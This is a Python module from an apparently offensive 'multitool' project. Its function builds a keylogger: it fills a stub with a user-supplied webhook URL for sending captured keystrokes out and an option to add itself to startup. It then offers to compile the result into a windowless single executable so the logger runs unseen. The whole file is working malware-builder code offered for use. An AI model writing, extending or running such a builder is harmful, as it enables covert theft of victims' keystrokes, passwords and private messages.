#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import os, json, re, subprocess
from core.display import get_inpt, Colorate, Theme

def build_keylogger():
    cl = Theme.get_colors()
    sp = os.path.join("modules/stub/", "keylogger_stub.txt")
    if not os.path.exists(sp):
        print(Colorate.Horizontal(cl["num"], "  [!] Missing keylogger_stub.txt"))
        return
    try:
        with open(sp, 'r', encoding='utf-8') as f:
            stub = f.read()
    except:
        print(Colorate.Horizontal(cl["num"], "  [!] Error reading stub."))
        return
    print(Colorate.Horizontal(cl["head"], "  [ NAVI KEYLOGGER BUILDER ]\n"))
    hook = get_inpt("webhook url:")
    if not hook: return
    startup = get_inpt("add to startup? (y/n):").lower() == 'y'
    stub = stub.replace("{{WEBHOOK}}", hook)
    stub = stub.replace("{{STARTUP}}", "True" if startup else "False")
    if not os.path.exists('output'): os.mkdir('output')
    out_name = "Navi_Logger.py"
    out_path = os.path.join('output', out_name)
    
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(stub)
    print(Colorate.Horizontal(cl["head"], f"\n  [+] Built: {out_path}"))
    if get_inpt("compile to exe? (y/n):").lower() == 'y':
        print(Colorate.Horizontal(cl["num"], "  [!] Compiling with PyInstaller..."))
        try:
            subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Navi_Logger {out_path}", shell=True)
            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Navi_Logger.exe"))
        except Exception as e:
            print(Colorate.Horizontal(cl["num"], f"  [!] Build Error: {e}"))

    subprocess.run(['explorer', os.path.abspath('output')])
